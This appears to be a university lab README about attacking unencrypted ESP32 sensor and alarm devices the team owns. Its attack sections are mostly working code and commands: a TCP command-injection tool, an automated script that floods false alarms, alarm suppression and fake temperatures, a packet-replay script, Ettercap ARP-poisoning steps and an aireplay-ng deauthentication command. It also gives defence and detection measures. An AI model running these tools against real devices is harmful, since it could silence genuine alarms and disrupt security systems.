# 🔔 IoT Sensor Attack Module - ESP32 Network Compromise

**⚠️ EDUCATIONAL USE ONLY - AUTHORIZED TESTING REQUIRED ⚠️**

This module demonstrates security vulnerabilities in unencrypted IoT sensor networks through Man-in-the-Middle (MITM) attacks, protocol analysis, and command injection. All experiments were conducted in a controlled laboratory environment on devices owned by the research team.

---

## 📋 Overview

**Target Devices:**
- **ESP32 A (Sensor Unit)** - IP: 192.168.0.101
  - Ultrasonic distance sensor
  - Temperature sensor (DHT11/DHT22)
  - Sends readings via Wi-Fi
  
- **ESP32 B (Buzzer Unit)** - IP: 192.168.0.103
  - Active buzzer/alarm
  - RGB LED indicator
  - Receives commands via Wi-Fi

**Communication Protocol:**
- Unencrypted TCP on Port 80
- Cleartext command strings
- No authentication mechanism
- No integrity verification

### Vulnerabilities Identified

1. **No ARP Validation** - Susceptible to ARP spoofing
2. **Cleartext Communication** - All commands visible in plain text
3. **Zero Authentication** - No credentials required
4. **No Encryption** - Data transmitted unencrypted over Wi-Fi
5. **Command Injection** - Accepts arbitrary commands from any source
6. **No Message Integrity** - No HMAC or checksums

---

## 🎯 Attack Methodology

### Complete Attack Chain

```
1. Network Discovery (netdiscover)
         ↓
2. ARP Spoofing (Ettercap)
         ↓
3. Packet Sniffing (Wireshark)
         ↓
4. Protocol Reverse Engineering
         ↓
5. Command Injection (Reply.py)
         ↓
6. Denial of Service (aireplay-ng)
```

---

## 📁 File Structure

```
iot-sensor-attack/
├── README.md                    # This file
├── Reply.py                     # Command injection tool
├── requirements.txt             # Python dependencies
├── examples/
│   ├── mitm-setup.md           # MITM attack walkthrough
│   ├── protocol-analysis.md    # Protocol documentation
│   ├── command-injection.md    # Injection examples
│   └── denial-of-service.md    # DoS attack guide
└── docs/
    ├── packet-captures/        # Example .pcap files
    └── screenshots/            # Attack demonstrations
```

---

## 🔧 Tool Documentation

### Reply.py - ESP32 Command Injection Tool

**Purpose:** Direct TCP command injection to ESP32 buzzer unit

**Features:**
- ✓ Simple menu-driven interface
- ✓ Direct TCP socket communication
- ✓ Multiple attack options
- ✓ Response monitoring
- ✓ Customizable target configuration

**Protocol Commands Identified:**

| Command | Format | Function | Response |
|---------|--------|----------|----------|
| ALARM | `ALARM\n` | Trigger buzzer/alarm | "Alarm triggered" |
| CLEAR | `CLEAR\n` | Silence buzzer | "Alarm cleared" |
| TEMP | `TEMP:XX\n` | Fake temperature reading | "Temperature updated: XX" |

**Code Structure:**

```python
#!/usr/bin/env python3
import socket
import time

# Configuration
TARGET_IP = "192.168.0.103"    # ESP32 Buzzer IP
TARGET_PORT = 80                # TCP port

def send_command(cmd):
    """
    Sends a command to the ESP32 device via TCP socket
    
    Args:
        cmd (str): Command string to send
        
    Returns:
        str: Response from device or error message
    """
    try:
        print(f"[*] Sending command: {cmd}")
        
        # Create TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        
        # Connect to target
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Send command with newline terminator
        s.sendall((cmd + "\n").encode())
        
        # Receive response
        response = s.recv(1024)
        print(f"[+] Response: {response.decode().strip()}")
        
        s.close()
        return response.decode().strip()
        
    except socket.timeout:
        print(f"[-] Error: Connection timeout")
        return None
    except ConnectionRefusedError:
        print(f"[-] Error: Connection refused - Check if device is online")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Main menu
print("=" * 50)
print("  ESP32 IoT Sensor Attack Tool")
print("=" * 50)
print("\n[!] Target Configuration:")
print(f"    IP: {TARGET_IP}")
print(f"    Port: {TARGET_PORT}")
print("\nAvailable Attacks:")
print("  1. Trigger Alarm")
print("  2. Silence Alarm")
print("  3. Fake Temperature (TEMP>50)")
print("  4. Custom Command")
print("  5. Exit")

while True:
    choice = input("\n[>] Select attack (1-5): ")
    
    if choice == '1':
        send_command("ALARM")
    elif choice == '2':
        send_command("CLEAR")
    elif choice == '3':
        temp = input("[?] Enter fake temperature (default 60): ") or "60"
        send_command(f"TEMP:{temp}")
    elif choice == '4':
        cmd = input("[?] Enter custom command: ")
        send_command(cmd)
    elif choice == '5':
        print("\n[*] Exiting...")
        break
    else:
        print("[-] Invalid choice")
```

**Requirements:**
- Python 3.6+
- Network access to target device
- No special privileges required

**Installation:**
```bash
# No dependencies needed - uses standard library only
python3 Reply.py
```

**Usage Examples:**

**Example 1: Trigger False Alarm**
```bash
$ python3 Reply.py
Select attack (1-5): 1
[*] Sending command: ALARM
[+] Response: Alarm triggered
```

**Example 2: Send Fake Temperature**
```bash
Select attack (1-5): 3
[?] Enter fake temperature (default 60): 85
[*] Sending command: TEMP:85
[+] Response: Temperature updated: 85
```

**Example 3: Custom Command**
```bash
Select attack (1-5): 4
[?] Enter custom command: STATUS
[*] Sending command: STATUS
[+] Response: System OK
```

---

## 🔬 Attack Scenarios

### Scenario 1: Complete MITM Attack Chain

**Objective:** Intercept sensor communications and reverse engineer protocol  
**Difficulty:** ⭐⭐ Medium

#### Phase 1: Network Discovery

**Step 1: Identify Target Devices**

```bash
# Scan the local network
sudo netdiscover -r 192.168.0.0/24
```

**Expected Output:**
```
Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.0.1     XX:XX:XX:XX:XX:XX      1      60  Tenda Technology
 192.168.0.101   AA:BB:CC:DD:EE:01      1      60  Espressif Inc.  ← Sensor
 192.168.0.103   AA:BB:CC:DD:EE:02      1      60  Espressif Inc.  ← Buzzer
 192.168.0.105   YY:YY:YY:YY:YY:YY      1      60  Unknown
```

**Key Information:**
- ESP32 devices identified by MAC vendor "Espressif Inc."
- Sensor Unit: 192.168.0.101
- Buzzer Unit: 192.168.0.103

---

#### Phase 2: ARP Spoofing Attack

**Step 2: Launch Ettercap GUI**

```bash
# Check network interface
ifconfig

# Launch Ettercap with GUI
sudo ettercap -G
```

**Step 3: Configure Ettercap**

1. Select interface (e.g., `wlan1`)
2. Start unified sniffing: `Sniff → Unified sniffing`
3. Scan for hosts: `Hosts → Scan for hosts`
4. View host list: `Hosts → Host list`

**Step 4: Add Targets**

- **Target 1:** 192.168.0.101 (Sensor) - Add to Target 1
- **Target 2:** 192.168.0.103 (Buzzer) - Add to Target 2

**Step 5: Execute ARP Poisoning**

```
MITM → ARP poisoning
☑ Sniff remote connections
[OK]
```

**What Happens:**
```
Normal Flow:
Sensor (192.168.0.101) ←→ Router ←→ Buzzer (192.168.0.103)

After ARP Spoofing:
Sensor (192.168.0.101) ←→ Attacker ←→ Router ←→ Attacker ←→ Buzzer (192.168.0.103)
                           ↓                      ↓
                    (Capture & Forward)    (Capture & Forward)
```

---

#### Phase 3: Protocol Analysis

**Step 6: Capture Traffic with Wireshark**

```bash
# Launch Wireshark
sudo wireshark

# Select interface: wlan1
# Start capture
```

**Step 7: Filter TCP Traffic**

Apply display filter:
```
tcp.port == 80 && ip.addr == 192.168.0.101
```

**Step 8: Analyze Captured Packets**

**Packet 1 - Temperature Reading:**
```
Source: 192.168.0.101:54321
Dest:   192.168.0.103:80
Protocol: TCP
Data: TEMP:28.0\n

TCP Payload (ASCII):
54 45 4D 50 3A 32 38 2E 30 0A
T  E  M  P  :  2  8  .  0  \n
```

**Packet 2 - Alarm Command:**
```
Source: 192.168.0.101:54322
Dest:   192.168.0.103:80
Protocol: TCP
Data: ALARM\n

TCP Payload (ASCII):
41 4C 41 52 4D 0A
A  L  A  R  M  \n
```

**Packet 3 - Clear Command:**
```
Source: 192.168.0.101:54323
Dest:   192.168.0.103:80
Protocol: TCP
Data: CLEAR\n

TCP Payload (ASCII):
43 4C 45 41 52 0A
C  L  E  A  R  \n
```

**Protocol Specification Discovered:**

| Field | Description |
|-------|-------------|
| Protocol | TCP |
| Port | 80 |
| Format | ASCII text |
| Terminator | `\n` (newline, 0x0A) |
| Commands | ALARM, CLEAR, TEMP:XX |
| Authentication | None |
| Encryption | None |

---

#### Phase 4: Command Injection

**Step 9: Test Direct Connection**

```bash
# Test with netcat
echo "ALARM" | nc 192.168.0.103 80
```

**Step 10: Use Attack Tool**

```bash
# Configure Reply.py with target IP
nano Reply.py
# Set: TARGET_IP = "192.168.0.103"

# Execute attack
python3 Reply.py
```

**Step 11: Inject Malicious Commands**

**Attack 1: False Alarm**
```
Select attack: 1
[*] Sending command: ALARM
[+] Response: Alarm triggered
Result: Buzzer activates without legitimate sensor trigger
```

**Attack 2: Suppress Real Alarm**
```
# When real motion detected and alarm should sound:
Select attack: 2
[*] Sending command: CLEAR
[+] Response: Alarm cleared
Result: Security breach - real alarm suppressed
```

**Attack 3: Fake Temperature Reading**
```
Select attack: 3
Enter fake temperature: 95
[*] Sending command: TEMP:95
[+] Response: Temperature updated: 95
Result: False high-temperature alert
```

---

#### Phase 5: Denial of Service

**Step 12: Deauthentication Attack**

```bash
# Identify the AP and target device
sudo airodump-ng wlan1mon

# Execute deauth against sensor
sudo aireplay-ng --deauth 0 \
  -a [ROUTER_BSSID] \
  -c [SENSOR_MAC] \
  wlan1mon
```

**Result:**
- Sensor disconnects from Wi-Fi
- No readings transmitted
- System believes everything is normal (no error detection)
- Security monitoring disabled

---

### Scenario 2: Automated Attack Script

**Objective:** Continuously inject commands to disrupt system  
**Difficulty:** ⭐ Easy

**Create `automated_attack.py`:**

```python
#!/usr/bin/env python3
"""
Automated IoT Sensor Attack
Continuously sends malicious commands
"""

import socket
import time
import random

TARGET_IP = "192.168.0.103"
TARGET_PORT = 80

def send_command(cmd):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall((cmd + "\n").encode())
        s.recv(1024)
        s.close()
        return True
    except:
        return False

print("[*] Starting automated attack...")
print("[!] Press Ctrl+C to stop")

try:
    while True:
        # Random attack selection
        attack = random.choice(['alarm', 'clear', 'temp'])
        
        if attack == 'alarm':
            print("[*] Triggering false alarm...")
            send_command("ALARM")
            time.sleep(5)
            
        elif attack == 'clear':
            print("[*] Suppressing alarm...")
            send_command("CLEAR")
            time.sleep(3)
            
        elif attack == 'temp':
            fake_temp = random.randint(50, 100)
            print(f"[*] Sending fake temperature: {fake_temp}°C")
            send_command(f"TEMP:{fake_temp}")
            time.sleep(2)

except KeyboardInterrupt:
    print("\n[*] Attack stopped")
```

**Usage:**
```bash
python3 automated_attack.py
```

**Effect:**
- Constant false alarms
- Suppression of real alerts
- Fake sensor readings
- System chaos

---

### Scenario 3: Replay Attack

**Objective:** Capture and replay legitimate commands  
**Difficulty:** ⭐ Easy

**Method 1: Using tcpreplay**

```bash
# Capture legitimate traffic
sudo tcpdump -i wlan1 -w capture.pcap host 192.168.0.101

# Wait for legitimate alarm trigger

# Replay the captured packet
sudo tcpreplay -i wlan1 capture.pcap
```

**Method 2: Using Wireshark + Python**

```python
#!/usr/bin/env python3
"""
Extract and replay TCP commands from PCAP file
"""

from scapy.all import *

def extract_commands(pcap_file):
    packets = rdpcap(pcap_file)
    commands = []
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            if pkt[TCP].dport == 80:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                commands.append(payload.strip())
    
    return commands

def replay_command(cmd, target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.sendall((cmd + "\n").encode())
    s.close()

# Extract commands
commands = extract_commands("capture.pcap")
print(f"[*] Extracted {len(commands)} commands")

# Replay each command
for cmd in commands:
    print(f"[*] Replaying: {cmd}")
    replay_command(cmd, "192.168.0.103", 80)
    time.sleep(1)
```

---

## 🛡️ Defense Recommendations

### For IoT Device Developers

**Critical Security Measures:**

1. **Implement Encryption**
```arduino
// Use TLS/SSL for all communications
WiFiClientSecure client;
client.setCACert(ca_cert);
```

2. **Add Authentication**
```arduino
// Implement API key authentication
const char* API_KEY = "your-secure-api-key";

void handleCommand(String cmd, String key) {
    if (key != API_KEY) {
        Serial.println("Unauthorized");
        return;
    }
    // Process command
}
```

3. **Use Message Authentication Codes**
```arduino
// Include HMAC for integrity verification
#include <mbedtls/md.h>

bool verifyHMAC(String message, String received_hmac) {
    String calculated_hmac = calculateHMAC(message);
    return (calculated_hmac == received_hmac);
}
```

4. **Implement Input Validation**
```arduino
void processCommand(String cmd) {
    // Whitelist allowed commands
    String allowed[] = {"ALARM", "CLEAR", "STATUS"};
    bool valid = false;
    
    for (String allowed_cmd : allowed) {
        if (cmd == allowed_cmd) {
            valid = true;
            break;
        }
    }
    
    if (!valid) {
        Serial.println("Invalid command");
        return;
    }
    
    // Process valid command
}
```

5. **Add Rate Limiting**
```arduino
// Prevent command flooding
unsigned long lastCommandTime = 0;
const int COMMAND_INTERVAL = 1000; // 1 second

void handleCommand(String cmd) {
    unsigned long now = millis();
    if (now - lastCommandTime < COMMAND_INTERVAL) {
        Serial.println("Rate limit exceeded");
        return;
    }
    lastCommandTime = now;
    // Process command
}
```

---

### Secure Protocol Design

**Replace cleartext TCP with MQTT over TLS:**

```arduino
#include <WiFiClientSecure.h>
#include <PubSubClient.h>

WiFiClientSecure espClient;
PubSubClient client(espClient);

void setup() {
    // Set CA certificate
    espClient.setCACert(ca_cert);
    
    // Configure MQTT
    client.setServer("mqtt.example.com", 8883); // TLS port
    client.setCallback(mqttCallback);
    
    // Connect with authentication
    client.connect("ESP32_Sensor", "username", "password");
    
    // Subscribe to command topic
    client.subscribe("sensor/commands");
}

void mqttCallback(char* topic, byte* payload, unsigned int length) {
    // Parse JSON with signature verification
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, payload, length);
    
    String command = doc["command"];
    String signature = doc["signature"];
    
    // Verify signature
    if (verifySignature(command, signature)) {
        processCommand(command);
    }
}
```

---

### Network-Level Protection

**1. Network Segmentation**
```
[Internet] ← Firewall → [Main Network]
                              ↓
                         [IoT VLAN]
                         - 192.168.10.0/24
                         - No direct internet access
                         - Restricted inter-VLAN traffic
```

**2. Firewall Rules**
```bash
# Only allow specific devices to communicate
iptables -A FORWARD -s 192.168.0.101 -d 192.168.0.103 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 192.168.0.103 -d 192.168.0.101 -p tcp --sport 80 -j ACCEPT
iptables -A FORWARD -j DROP
```

**3. ARP Spoofing Protection**
```bash
# Static ARP entries
arp -s 192.168.0.101 AA:BB:CC:DD:EE:01
arp -s 192.168.0.103 AA:BB:CC:DD:EE:02

# Enable ARP filtering on Linux
sysctl -w net.ipv4.conf.all.arp_filter=1
```

**4. Intrusion Detection**
```bash
# Use Snort or Suricata
# Alert on suspicious ARP traffic
alert arp any any -> any any (msg:"ARP spoofing attempt"; \
    reference:arachnids,30; classtype:attempted-recon; sid:1000001;)
```

---

## 📊 Vulnerability Summary

| Vulnerability | Severity | Impact | Fix Priority |
|---------------|----------|--------|--------------|
| No Encryption | 🔴 Critical | Complete data exposure | P0 |
| No Authentication | 🔴 Critical | Unauthorized access | P0 |
| Cleartext Protocol | 🔴 Critical | Command injection | P0 |
| ARP Spoofing | 🟠 High | MITM attacks | P1 |
| No Input Validation | 🟠 High | Command injection | P1 |
| No Rate Limiting | 🟡 Medium | DoS attacks | P2 |
| No Integrity Check | 🟡 Medium | Data manipulation | P2 |

---

## 🔍 Detection Methods

### Signs of Attack

**Network Level:**
- Duplicate MAC addresses (ARP spoofing)
- Unusual ARP traffic patterns
- Increased broadcast traffic
- Unexpected device connections

**Device Level:**
- Commands received without trigger
- Unexpected alarm states
- Sensor readings inconsistent
- Rapid state changes

**Monitoring Tools:**

```bash
# Monitor ARP table changes
watch -n 1 'arp -a'

# Detect ARP spoofing with arpwatch
sudo arpwatch -i wlan1

# Monitor TCP connections
sudo netstat -tn | grep :80

# Capture suspicious traffic
sudo tcpdump -i wlan1 -nn 'tcp port 80'
```

---

## ⚖️ Legal & Ethical Considerations

### ⛔ DO NOT:

- ❌ Attack IoT devices you don't own
- ❌ Disrupt critical infrastructure
- ❌ Access unauthorized networks
- ❌ Steal or manipulate data
- ❌ Cause harm or property damage

### ✅ ACCEPTABLE:

- ✓ Test your own IoT devices
- ✓ Lab environment research
- ✓ Authorized penetration testing
- ✓ Security awareness training
- ✓ Responsible disclosure

### Legal Framework

**Applicable Laws:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar legislation worldwide

**Penalties:**
- Criminal prosecution
- Fines up to $250,000
- Imprisonment up to 20 years
- Civil liability

---

## 📚 Additional Resources

### Tools Used

- **Ettercap** - MITM framework
- **Wireshark** - Packet analyzer
- **netdiscover** - Network scanner
- **aireplay-ng** - Deauthentication tool
- **Python** - Custom scripting

### Further Reading

- "IoT Security: A Practical Guide"
- "Network Protocol Analysis"
- "Wireless Network Security"
- OWASP IoT Top 10

---

## 🤝 Contributing

Improvements welcome:

1. Test on your own devices
2. Document new attack vectors
3. Propose defense mechanisms
4. Submit pull requests
5. Follow responsible disclosure

---

## 📝 Changelog

**v1.0.0** - Initial Release
- Command injection tool (Reply.py)
- Complete MITM attack documentation
- Protocol analysis
- Defense recommendations

---

## 👥 Credits

**Research Team:**
- Meshari Alqahtani
- Hussam Almuqbil
- Mohammed Alyami
- Mohammed Almuhaini

**Project:** IoT & Wireless Security Penetration Testing  
**Date:** December 2024

---

## 📞 Contact

**For educational or research questions:**
- Contact through academic channels only
- No support for unauthorized use

---

**⚠️ REMEMBER: These tools expose real security flaws in IoT devices. Use them ethically to improve security, not to cause harm.**

**Stay Secure. Stay Legal. Stay Ethical.** 🔐🛡️
